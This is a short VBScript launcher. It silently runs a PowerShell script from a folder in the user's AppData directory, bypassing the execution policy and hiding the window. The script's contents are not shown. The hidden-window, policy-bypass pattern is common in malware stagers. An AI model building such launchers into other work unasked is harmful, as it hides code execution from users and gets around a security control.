Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -ExecutionPolicy Bypass -File ""%appdata%\nvd_s\dt\NVD_S.PS1""", 0, True
